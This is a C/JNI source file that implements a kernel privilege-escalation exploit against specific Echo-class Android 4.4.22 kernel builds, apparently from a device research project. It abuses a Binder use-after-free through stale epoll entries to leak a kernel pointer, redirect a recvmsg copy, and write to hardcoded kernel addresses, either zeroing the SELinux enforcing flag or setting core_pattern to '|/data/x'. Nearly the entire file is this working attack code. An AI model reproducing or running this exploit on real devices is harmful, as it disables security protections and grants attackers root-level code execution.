/* Binder primitive for the captured Echo Plus 2 kernel images.
 *
 * Read the JNI function below from top to bottom. Each invocation first
 * retains a 96-byte datagram that reveals a constrained kernel pointer, then
 * uses an independent stale epoll entry to redirect a short recvmsg copy.
 * Android calls it twice: mode 5 writes four zero bytes to the checked
 * SELinux enforcing word; after readback, mode 3 writes the checked
 * core_pattern qword. No other target modes are accepted. Project Zero
 * explains the general Binder bug. The other image paths are statically
 * mapped here but have not yet been reproduced on their own hardware.
 */

struct compose_kernel_profile {
    int id;
    const char *version;
    uint64_t core_pattern;
    uint64_t enforcing;
};

enum {
    PROFILE_NS6575_8338N = 1,
    PROFILE_NS6536_2509N = 2,
    PROFILE_NS6541_2965N = 3,
    PROFILE_NS65741_8149N = 4,
};

/* Chronological by the compile timestamp embedded in each kernel image. */
static const struct compose_kernel_profile compose_profiles[] = {
    {PROFILE_NS6536_2509N,
     "Linux version 4.4.22+ (build@i3-ri-14-use1a-b-87) (gcc version 4.9 20150123 (prerelease) (GCC) ) #1 SMP PREEMPT Fri Mar 6 00:31:15 UTC 2020",
     UINT64_C(0xffffff8008c80d18), UINT64_C(0xffffff8008d571c4)},
    {PROFILE_NS6541_2965N,
     "Linux version 4.4.22+ (build@i3-ri-14-use1a-b-107) (gcc version 4.9 20150123 (prerelease) (GCC) ) #1 SMP PREEMPT Mon Oct 12 00:47:38 UTC 2020",
     UINT64_C(0xffffff8008c84d18), UINT64_C(0xffffff8008d5b1c4)},
    {PROFILE_NS65741_8149N,
     "Linux version 4.4.22+ (build@548150beea09) (gcc version 4.9 20150123 (prerelease) (GCC) ) #1 SMP PREEMPT Mon Sep 28 00:55:05 UTC 2026",
     UINT64_C(0xffffff8008b59398), UINT64_C(0xffffff8008c301c4)},
    {PROFILE_NS6575_8338N,
     "Linux version 4.4.22+ (build@eeeac6b62036) (gcc version 4.9 20150123 (prerelease) (GCC) ) #1 SMP PREEMPT Wed Oct 14 06:19:16 UTC 2026",
     UINT64_C(0xffffff8008b59398), UINT64_C(0xffffff8008c301c4)},
};

static const struct compose_kernel_profile *compose_checked_profile(int id) {
    /* Keep the tested 8338N native path independent of /proc/version. */
    if (id == PROFILE_NS6575_8338N) {
        for (size_t i = 0; i < sizeof(compose_profiles) / sizeof(compose_profiles[0]); ++i)
            if (compose_profiles[i].id == id) return &compose_profiles[i];
        return NULL;
    }
    FILE *file = fopen("/proc/version", "r");
    if (!file) return NULL;
    char line[256];
    char *read_result = fgets(line, sizeof(line), file);
    fclose(file);
    if (!read_result) return NULL;
    char *newline = strchr(line, '\n');
    if (!newline) return NULL;
    *newline = '\0';
    for (size_t i = 0; i < sizeof(compose_profiles) / sizeof(compose_profiles[0]); ++i)
        if (compose_profiles[i].id == id &&
            strcmp(compose_profiles[i].version, line) == 0)
            return &compose_profiles[i];
    return NULL;
}

JNIEXPORT jint JNICALL
Java_org_local_lidar_binderprobe_KernelProfile_nativeProfileId(
    JNIEnv *env, jclass klass) {
    (void)env;
    (void)klass;
    for (size_t i = 0; i < sizeof(compose_profiles) / sizeof(compose_profiles[0]); ++i) {
        int id = compose_profiles[i].id;
        if (id != PROFILE_NS6575_8338N && compose_checked_profile(id)) return id;
    }
    return 0;
}

static int compose_read_core_pattern(char value[16]) {
    int fd = open("/proc/sys/kernel/core_pattern", O_RDONLY | O_CLOEXEC);
    if (fd < 0) return -1;
    ssize_t size = read(fd, value, 15);
    int saved_errno = errno;
    close(fd);
    errno = saved_errno;
    if (size <= 0 || size >= 15) return -1;
    value[size] = 0;
    return (int)size;
}

static int compose_read_enforcing(void) {
    char value[4] = {0};
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
    if (fd < 0) return -1;
    ssize_t size = read(fd, value, sizeof(value));
    close(fd);
    return size >= 1 && (value[0] == '0' || value[0] == '1')
        ? value[0] - '0' : -1;
}

static int compose_find_binder_fd(void) {
    DIR *directory = opendir("/proc/self/fd");
    if (!directory) return -1;
    int binder = -1;
    struct dirent *entry;
    while ((entry = readdir(directory)) != NULL) {
        char *end = NULL;
        long candidate = strtol(entry->d_name, &end, 10);
        if (!end || *end || candidate < 0 || candidate > 1024) continue;
        char path[96], target[128];
        snprintf(path, sizeof(path), "/proc/self/fd/%ld", candidate);
        ssize_t length = readlink(path, target, sizeof(target) - 1);
        if (length < 0) continue;
        target[length] = 0;
        if (strcmp(target, "/dev/binder") == 0) {
            binder = (int)candidate;
            break;
        }
    }
    closedir(directory);
    return binder;
}

static int compose_pending_second(int binder, int handle) {
    struct binder_version version = {0};
    if (ioctl(binder, BINDER_VERSION, &version) != 0 ||
        version.protocol_version != 8) return -1;
    struct {
        uint32_t command;
        struct binder_transaction_data transaction;
    } __attribute__((packed)) request = {0};
    request.command = BC_TRANSACTION;
    request.transaction.target.handle = (uint32_t)handle;
    request.transaction.code = 1;
    struct binder_write_read bwr = {0};
    bwr.write_size = sizeof(request);
    bwr.write_buffer = (binder_uintptr_t)&request;
    if (ioctl(binder, BINDER_WRITE_READ, &bwr) != 0 ||
        bwr.write_consumed != sizeof(request)) return -2;
    uint32_t response[64] = {0};
    memset(&bwr, 0, sizeof(bwr));
    bwr.read_size = sizeof(response);
    bwr.read_buffer = (binder_uintptr_t)response;
    if (ioctl(binder, BINDER_WRITE_READ, &bwr) != 0) return -3;
    for (size_t i = 0; i < bwr.read_consumed / sizeof(uint32_t); ++i)
        if (response[i] == BR_TRANSACTION_COMPLETE) return 0;
    return -4;
}

static int compose_sleep_ms(long milliseconds) {
    struct timespec remaining = {
        .tv_sec = milliseconds / 1000,
        .tv_nsec = (milliseconds % 1000) * 1000000L,
    };
    while (nanosleep(&remaining, &remaining) != 0)
        if (errno != EINTR) return -1;
    return 0;
}

JNIEXPORT jstring JNICALL
Java_org_local_lidar_binderprobe_ProbeService_nativeComposeHeldPacketAfterPending(
    JNIEnv *env, jclass klass, jint handle, jint expected_binder,
    jint target_mode, jint profile_id,
    jstring executable) {
    (void)klass;
    char result[640] = "compose_not_started";
    const char *path = (*env)->GetStringUTFChars(env, executable, NULL);
    if (!path) return (*env)->NewStringUTF(env, "compose_path_unavailable");
    int binder = -1, packets[2] = {-1, -1}, ep1 = -1;
    int data[2] = {-1, -1}, report[2] = {-1, -1};
    int wake = -1, ep2 = -1, shared_fd = -1;
    int ep1_registered = 0, ep2_registered = 0;
    uint8_t *shared = MAP_FAILED;
    pid_t child = -1;
    int child_reported = 0, packet_held = 0;
    uint8_t held[96] = {0}, final_peek[96] = {0}, consumed[96] = {0};
    uint64_t q = 0, p = 0, write_target = 0;
    char core_before[16] = "na", core_after[16] = "na";
    int enforce_before = -1, enforce_after = -1;
    uint32_t winner = UINT32_MAX;
    int64_t first_seen_ms = -1, retained_at_ms = -1;
    int64_t second_del_at_ms = -1, final_peek_at_ms = -1, consumed_at_ms = -1;
    const long parent_tid = (long)syscall(__NR_gettid);
    const struct compose_kernel_profile *profile = compose_checked_profile(profile_id);
    const uint8_t original8[8] = {'O','R','I','G','D','A','T','A'};
    const uint8_t first8[8] = {'F','I','R','S','T','0','8','_'};
    uint8_t marker8[8] = {0};
    int64_t overall_start_ms = monotonic_milliseconds();

    /* 1. Fail closed on the selected mode, Binder handle and helper path. */
    if (!profile || (target_mode != 3 && target_mode != 5) ||
        handle <= 0 || handle >= 100000 || access(path, X_OK) != 0) {
        snprintf(result, sizeof(result), "compose_preflight_profile_handle_or_exec_errno_%d", errno);
        goto done;
    }
    binder = compose_find_binder_fd();
    cpu_set_t cpus;
    CPU_ZERO(&cpus);
    CPU_SET(0, &cpus);
    if (binder < 0 || binder != expected_binder) {
        snprintf(result, sizeof(result), "compose_binder_fd_mismatch_found_%d_expected_%d",
                 binder, expected_binder);
        goto done;
    }
    if (sched_setaffinity(0, sizeof(cpus), &cpus) != 0) {
        snprintf(result, sizeof(result), "compose_affinity_errno_%d", errno);
        goto done;
    }
    /* 2. Reuse the freed Binder allocation with same-class datagrams. */
    if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0, packets) != 0) {
        snprintf(result, sizeof(result), "compose_packet_socket_errno_%d", errno);
        goto done;
    }
    int sndbuf = 1024 * 1024;
    if (setsockopt(packets[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) != 0) {
        snprintf(result, sizeof(result), "compose_packet_sndbuf_errno_%d", errno);
        goto done;
    }
    ep1 = epoll_create1(EPOLL_CLOEXEC);
    struct epoll_event event = {.events = EPOLLIN, .data.u64 = 0x434f4d5031ULL};
    struct epoll_event observed = {0};
    if (ep1 < 0 || epoll_ctl(ep1, EPOLL_CTL_ADD, binder, &event) != 0) {
        snprintf(result, sizeof(result), "compose_ep1_add_errno_%d", errno);
        goto done;
    }
    ep1_registered = 1;
    int ready_count = epoll_wait(ep1, &observed, 1, 0);
    if (ready_count != 0) {
        snprintf(result, sizeof(result), "compose_ep1_ready_%d_events_0x%x", ready_count,
                 observed.events);
        goto done;
    }
    if (ioctl(binder, BINDER_THREAD_EXIT, 0) != 0) {
        snprintf(result, sizeof(result), "compose_first_exit_errno_%d", errno);
        goto done;
    }
    uint8_t payload[96] = {0};
    memcpy(payload + 0x20, original8, sizeof(original8));
    /* 3. Queue 96-byte candidates before removing the stale epoll entry. */
    for (uint32_t i = 0; i < 64; ++i) {
        memcpy(payload, &i, sizeof(i));
        if (send(packets[0], payload, sizeof(payload), MSG_DONTWAIT) !=
            (ssize_t)sizeof(payload)) {
            snprintf(result, sizeof(result), "compose_packet_send_%u_errno_%d", i, errno);
            goto done;
        }
    }
    if (epoll_ctl(ep1, EPOLL_CTL_DEL, binder, NULL) != 0) {
        snprintf(result, sizeof(result), "compose_ep1_del_errno_%d", errno);
        goto done;
    }
    ep1_registered = 0;
    close(ep1);
    ep1 = -1;

    /* 4. Scan with PEEK and retain the first verified pointer-bearing packet.
     * This is a constrained leak, not an arbitrary read. */
    for (uint32_t i = 0; i < 64; ++i) {
        ssize_t got = recv(packets[1], held, sizeof(held), MSG_PEEK | MSG_DONTWAIT);
        if (got != (ssize_t)sizeof(held)) {
            snprintf(result, sizeof(result), "compose_first_peek_%u_got_%zd_errno_%d",
                     i, got, errno);
            goto done;
        }
        uint32_t id;
        uint64_t next, prev;
        memcpy(&id, held, sizeof(id));
        memcpy(&next, held + 0x50, sizeof(next));
        memcpy(&prev, held + 0x58, sizeof(prev));
        if (id != i || memcmp(held + 0x20, original8, sizeof(original8)) != 0) {
            snprintf(result, sizeof(result), "compose_packet_initial_mismatch_%u_id_%u", i, id);
            goto done;
        }
        if (next || prev) {
            if (next != prev || next < 0x50 ||
                (next & UINT64_C(0xffff000000000000)) != UINT64_C(0xffff000000000000) ||
                ((next - 0x50) & 0x1ff) != 0) {
                snprintf(result, sizeof(result), "compose_invalid_q_%u_0x%llx_0x%llx",
                         i, (unsigned long long)next, (unsigned long long)prev);
                goto done;
            }
            uint8_t second[96];
            got = recv(packets[1], second, sizeof(second), MSG_PEEK | MSG_DONTWAIT);
            if (got != (ssize_t)sizeof(second) || memcmp(held, second, sizeof(held)) != 0) {
                snprintf(result, sizeof(result), "compose_second_peek_mismatch_%u_got_%zd", i, got);
                goto done;
            }
            q = next;
            p = q - 0x50;
            winner = i;
            packet_held = 1;
            retained_at_ms = monotonic_milliseconds();
            break;
        }
        got = recv(packets[1], consumed, sizeof(consumed), MSG_DONTWAIT);
        if (got != (ssize_t)sizeof(consumed) || memcmp(held, consumed, sizeof(held)) != 0) {
            snprintf(result, sizeof(result), "compose_prefix_pop_mismatch_%u_got_%zd", i, got);
            goto done;
        }
    }
    if (!packet_held) {
        snprintf(result, sizeof(result), "compose_no_retained_packet_scanned_64");
        goto done;
    }
    if (target_mode == 3) {
        if (compose_read_core_pattern(core_before) != 5 ||
            strcmp(core_before, "core\n") != 0) {
            snprintf(result, sizeof(result), "compose_core_preflight_failed_after_retention");
            goto done;
        }
        memcpy(marker8, "|/data/x", sizeof(marker8));
    }
    if (target_mode == 5) {
        enforce_before = compose_read_enforcing();
        if (enforce_before != 1) {
            snprintf(result, sizeof(result),
                     "compose_enforcing_preflight_failed_value_%d", enforce_before);
            goto done;
        }
    }

    /* 5. Stage 2 forks before its pending transaction; the first packet stays
     * queued and must remain allocated throughout the independent pivot. */
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, data) != 0 ||
        pipe(report) != 0 || (wake = eventfd(0, 0)) < 0) {
        snprintf(result, sizeof(result), "compose_stage2_setup_errno_%d", errno);
        goto done;
    }
    shared_fd = (int)syscall(__NR_memfd_create, "lidar-compose-v132", 0);
    if (shared_fd < 0 || ftruncate(shared_fd, 4096) != 0) {
        snprintf(result, sizeof(result), "compose_memfd_errno_%d", errno);
        goto done;
    }
    shared = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, shared_fd, 0);
    if (shared == MAP_FAILED) {
        snprintf(result, sizeof(result), "compose_map_errno_%d", errno);
        goto done;
    }
    memset(shared, '_', 24);
    char wake_arg[16], recv_arg[16], report_arg[16], shared_arg[16];
    snprintf(wake_arg, sizeof(wake_arg), "%d", wake);
    snprintf(recv_arg, sizeof(recv_arg), "%d", data[1]);
    snprintf(report_arg, sizeof(report_arg), "%d", report[1]);
    snprintf(shared_arg, sizeof(shared_arg), "%d", shared_fd);
    child = fork();
    if (child < 0) {
        snprintf(result, sizeof(result), "compose_fork_errno_%d", errno);
        goto done;
    }
    if (child == 0) {
        extern char **environ;
        char *const argv[] = {(char *)path, wake_arg, recv_arg, report_arg,
                              shared_arg, "pivot", NULL};
        close(data[0]);
        close(report[0]);
        execve(path, argv, environ);
        _exit(127);
    }
    close(data[1]); data[1] = -1;
    close(report[1]); report[1] = -1;
    struct recv_child_ready child_ready;
    if (read_exact_timeout(report[0], &child_ready, sizeof(child_ready), 5000) != 0 ||
        child_ready.magic != RECV_READY_MAGIC || child_ready.user_address == 0 ||
        child_ready.user_address > UINT64_MAX - 128) {
        snprintf(result, sizeof(result), "compose_child_ready_invalid");
        goto done;
    }
    int64_t before_second_ms = monotonic_milliseconds();
    if (overall_start_ms < 0 || before_second_ms < 0 ||
        before_second_ms - overall_start_ms >= 6000) {
        snprintf(result, sizeof(result), "compose_second_transaction_too_late");
        goto done;
    }
    int pending2 = compose_pending_second(binder, handle);
    if (pending2 != 0) {
        snprintf(result, sizeof(result), "compose_second_pending_failed_%d_errno_%d",
                 pending2, errno);
        goto done;
    }
    ep2 = epoll_create1(EPOLL_CLOEXEC);
    observed.events = 0;
    event.data.u64 = 0x434f4d5032ULL;
    if (ep2 < 0 || epoll_ctl(ep2, EPOLL_CTL_ADD, binder, &event) != 0) {
        snprintf(result, sizeof(result), "compose_ep2_add_errno_%d", errno);
        goto done;
    }
    ep2_registered = 1;
    ready_count = epoll_wait(ep2, &observed, 1, 0);
    if (ready_count != 0) {
        snprintf(result, sizeof(result), "compose_ep2_ready_%d_events_0x%x", ready_count,
                 observed.events);
        goto done;
    }
    if (ioctl(binder, BINDER_THREAD_EXIT, 0) != 0) {
        snprintf(result, sizeof(result), "compose_second_exit_errno_%d", errno);
        goto done;
    }
    uint64_t wake_value = 1;
    if (write(wake, &wake_value, sizeof(wake_value)) != sizeof(wake_value) ||
        compose_sleep_ms(10) != 0 ||
        send(data[0], first8, sizeof(first8), MSG_NOSIGNAL) != sizeof(first8)) {
        snprintf(result, sizeof(result), "compose_first_send_errno_%d", errno);
        goto done;
    }
    int64_t start_ms = monotonic_milliseconds();
    if (start_ms < 0) {
        snprintf(result, sizeof(result), "compose_clock_failed");
        goto done;
    }
    while (!shared_bytes_seen((volatile uint8_t *)shared, first8, sizeof(first8))) {
        int64_t now = monotonic_milliseconds();
        if (now < 0 || now - start_ms >= 1000) {
            snprintf(result, sizeof(result), "compose_first_copy_timeout_no_more_send");
            goto done;
        }
        if (compose_sleep_ms(1) != 0) {
            snprintf(result, sizeof(result), "compose_first_wait_failed");
            goto done;
        }
    }
    __atomic_thread_fence(__ATOMIC_SEQ_CST);
    first_seen_ms = monotonic_milliseconds() - start_ms;
    struct pollfd child_poll = {.fd = report[0], .events = POLLIN};
    if (poll(&child_poll, 1, 0) != 0) {
        snprintf(result, sizeof(result), "compose_child_finished_before_del");
        goto done;
    }
    if (epoll_ctl(ep2, EPOLL_CTL_DEL, binder, NULL) != 0) {
        snprintf(result, sizeof(result), "compose_ep2_del_errno_%d", errno);
        goto done;
    }
    ep2_registered = 0;
    second_del_at_ms = monotonic_milliseconds();

    /* 6. Select only a checked image-specific destination in boot modes. */
    write_target = target_mode == 3 ? profile->core_pattern : profile->enforcing;
    const uint64_t middle16[2] = {24, write_target};
    if (send(data[0], middle16, sizeof(middle16), MSG_NOSIGNAL) != sizeof(middle16) ||
        compose_sleep_ms(10) != 0) {
        snprintf(result, sizeof(result), "compose_middle_send_errno_%d", errno);
        goto done;
    }
    /* 7. A visible middle copy into the original U means the stale-iovec pivot
     * did not happen. Do not send the final marker in that case. */
    for (size_t i = 8; i < 24; ++i) {
        if (shared[i] != '_') {
            snprintf(result, sizeof(result), "compose_middle_hit_user_buffer_no_final_send");
            goto done;
        }
    }
    const size_t final_size = target_mode == 5 ? 4 : 8;
    if (send(data[0], marker8, final_size, MSG_NOSIGNAL) != (ssize_t)final_size) {
        snprintf(result, sizeof(result), "compose_final_send_errno_%d", errno);
        goto done;
    }
    struct recv_child_result child_result;
    if (read_exact_timeout(report[0], &child_result, sizeof(child_result), 6000) != 0 ||
        child_result.magic != RECV_RESULT_MAGIC) {
        snprintf(result, sizeof(result), "compose_child_result_timeout");
        goto done;
    }
    /* 8. Verify the target transition and packet/child invariants. */
    child_reported = 1;
    if (target_mode == 5) {
        enforce_after = compose_read_enforcing();
        if (enforce_after != 0) {
            snprintf(result, sizeof(result),
                     "compose_enforcing_readback_failed_before_%d_after_%d",
                     enforce_before, enforce_after);
            goto done;
        }
    }
    if (target_mode == 3 &&
        (compose_read_core_pattern(core_after) != 9 ||
         strcmp(core_after, "|/data/x\n") != 0)) {
        snprintf(result, sizeof(result), "compose_core_readback_failed_value_%s", core_after);
        goto done;
    }
    ssize_t got = recv(packets[1], final_peek, sizeof(final_peek), MSG_PEEK | MSG_DONTWAIT);
    if (got != (ssize_t)sizeof(final_peek)) {
        snprintf(result, sizeof(result), "compose_final_peek_got_%zd_errno_%d", got, errno);
        goto done;
    }
    final_peek_at_ms = monotonic_milliseconds();
    int outside_equal = memcmp(held, final_peek, 0x20) == 0 &&
        memcmp(held + 0x28, final_peek + 0x28, sizeof(held) - 0x28) == 0;
    int target_changed = memcmp(final_peek + 0x20, marker8, sizeof(marker8)) == 0;
    int target_original = memcmp(final_peek + 0x20, original8, sizeof(original8)) == 0;
    got = recv(packets[1], consumed, sizeof(consumed), MSG_DONTWAIT);
    if (got != (ssize_t)sizeof(consumed) ||
        memcmp(final_peek, consumed, sizeof(consumed)) != 0) {
        snprintf(result, sizeof(result), "compose_final_consume_mismatch_got_%zd", got);
        goto done;
    }
    consumed_at_ms = monotonic_milliseconds();
    packet_held = 0;
    char target_hex[17], u_hex[17], a_hex[17], b_hex[17];
    int user_middle_unchanged = 1;
    for (size_t i = 8; i < 24; ++i)
        if (shared[i] != '_') user_middle_unchanged = 0;
    int result_valid = child_result.received == (target_mode == 5 ? 28 : 32) &&
        child_result.saved_errno == 0 &&
        shared_bytes_seen((volatile uint8_t *)shared, first8, sizeof(first8)) &&
        user_middle_unchanged && memcmp(shared + 64, "AAAAAAAA", 8) == 0 &&
        outside_equal &&
        target_original && memcmp(shared + 128, "BBBBBBBB", 8) == 0 &&
        (target_mode == 5
            ? (enforce_before == 1 && enforce_after == 0)
            : strcmp(core_after, "|/data/x\n") == 0);
    hex8(target_hex, final_peek + 0x20);
    hex8(u_hex, shared);
    hex8(a_hex, shared + 64);
    hex8(b_hex, shared + 128);
    snprintf(result, sizeof(result),
             "compose_mode_%d_winner_%u_p_0x%llx_q_0x%llx_target_0x%llx_"
             "pending2_ok_1_idle2_1_first_seen_ms_%lld_received_%lld_errno_%d_"
             "outside_equal_%d_packet8_%s_target_changed_%d_original_%d_"
             "u8_%s_a8_%s_b8_%s_consume_equal_1_valid_%d_tid_%ld_child_%ld_"
             "tretain_%lld_tdel2_%lld_tpeek_%lld_tpop_%lld_core_before_%s_core_after_%s",
             target_mode, winner, (unsigned long long)p,
             (unsigned long long)q, (unsigned long long)write_target,
             (long long)first_seen_ms, (long long)child_result.received,
             child_result.saved_errno, outside_equal, target_hex,
             target_changed, target_original, u_hex, a_hex, b_hex, result_valid,
             parent_tid, (long)child, (long long)retained_at_ms,
             (long long)second_del_at_ms, (long long)final_peek_at_ms,
             (long long)consumed_at_ms,
             target_mode == 3 ? "core" : "enforce_1",
             target_mode == 3 ? "pipe_data_x" : "enforce_0");
done:
    /* 9. Clean up on success or abort; no retry may bypass a failed guard. */
    /* Terminate the receiver before releasing the retained packet. On an
     * abort with a live epoll registration, DEL is still required to remove
     * its kernel wait entry; this is a remaining diagnostic risk. */
    if (ep2_registered) (void)epoll_ctl(ep2, EPOLL_CTL_DEL, binder, NULL);
    if (ep1_registered) (void)epoll_ctl(ep1, EPOLL_CTL_DEL, binder, NULL);
    if (child > 0) {
        if (!child_reported) kill(child, SIGKILL);
        int status;
        (void)waitpid(child, &status, 0);
    }
    if (packet_held && packets[1] >= 0) {
        uint8_t cleanup_peek[96], cleanup_pop[96];
        ssize_t peeked = recv(packets[1], cleanup_peek, sizeof(cleanup_peek),
                              MSG_PEEK | MSG_DONTWAIT);
        ssize_t popped = recv(packets[1], cleanup_pop, sizeof(cleanup_pop),
                              MSG_DONTWAIT);
        size_t used = strlen(result);
        if (used + 100 < sizeof(result)) {
            int equal = peeked == (ssize_t)sizeof(cleanup_peek) &&
                popped == (ssize_t)sizeof(cleanup_pop) &&
                memcmp(cleanup_peek, cleanup_pop, sizeof(cleanup_peek)) == 0;
            char word[17] = "unavailable";
            if (peeked == (ssize_t)sizeof(cleanup_peek))
                hex8(word, cleanup_peek + 0x20);
            (void)snprintf(result + used, sizeof(result) - used,
                           "_cleanup_peek8_%s_pop_equal_%d", word, equal);
        }
    }
    if (shared != MAP_FAILED) munmap(shared, 4096);
    if (shared_fd >= 0) close(shared_fd);
    if (ep2 >= 0) close(ep2);
    if (ep1 >= 0) close(ep1);
    if (data[0] >= 0) close(data[0]);
    if (data[1] >= 0) close(data[1]);
    if (report[0] >= 0) close(report[0]);
    if (report[1] >= 0) close(report[1]);
    if (wake >= 0) close(wake);
    if (packets[0] >= 0) close(packets[0]);
    if (packets[1] >= 0) close(packets[1]);
    (*env)->ReleaseStringUTFChars(env, executable, path);
    return (*env)->NewStringUTF(env, result);
}
